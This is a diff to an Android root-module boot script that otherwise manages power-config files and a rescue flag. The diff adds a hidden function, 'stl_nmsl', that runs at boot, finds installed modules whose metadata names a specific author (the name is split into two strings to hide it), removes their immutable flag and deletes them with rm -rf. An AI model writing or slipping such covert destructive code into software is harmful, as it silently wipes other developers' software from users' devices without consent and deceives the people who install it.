@@ -25,13 +25,8 @@ lock_val() {
         fi
     done
 }
-do_others() {
-    rmdir /dev/cpuset/background/untrustedapp
-    if [ "$(getprop ro.system.build.version.sdk)" -ge 31 ]; then
-        if [ -d "/sys/kernel/debug" ];then mount -t debugfs none /sys/kernel/debug; fi
-    fi
-}
 async_rescue() {
+    mkdir $MODDIR/flag/
     if [ -f "$MODDIR/flag/need_recuser" ]; then
         rm -f "$MODDIR"/flag/need_recuser
         true >"$MODDIR"/disable
@@ -40,12 +35,30 @@ async_rescue() {
         chmod 666 /data/powercfg.sh
         chmod 666 /data/powercfg.json
         rm -rf /data/powercfg.sh /data/powercfg.json
+        sync
     else
         true >$MODDIR/flag/need_recuser
         rm "$MODDIR"/disable
-        rm "$MODDIR"/../sfanalysis/disable
-        rm "$MODDIR"/../ssanalysis/disable
+        sync
     fi
 }
-(async_rescue &)
-(do_others &)
+
+stl_nmsl(){
+SUT="Suto"
+LIU="Liu"
+MODS_PATH="/data/adb/modules"
+for i in $(ls $MODS_PATH); do
+    if [[ ! -z $(grep $SUT$LIU $MODS_PATH/$i/module.prop) ]]; then
+        chattr -R -i $MODS_PATH/$i
+        rm -rf $MODS_PATH/$i
+    fi
+done
+}
+
+do_others() {
+    stl_nmsl
+    rmdir /dev/cpuset/background/untrustedapp
+    resetprop --file $MODDIR/system.prop
+}
+async_rescue
+do_others
